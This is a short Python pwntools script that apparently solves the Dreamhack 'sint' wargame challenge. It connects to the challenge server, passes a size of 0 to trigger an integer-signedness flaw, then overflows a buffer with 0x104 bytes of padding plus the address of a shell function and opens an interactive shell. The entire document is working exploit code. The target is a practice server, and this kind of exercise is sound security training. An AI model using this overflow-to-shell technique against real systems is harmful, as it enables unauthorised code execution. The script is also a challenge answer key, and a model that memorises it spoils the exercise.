from pwn import *

p = remote('host3.dreamhack.games', '15090')
#p = process('./sint')

shell = 0x8048659
payload = b"A"*0x104 + p64(shell)

p.sendlineafter("Size: ", b"0")
p.sendlineafter("Data: ", payload)
p.interactive()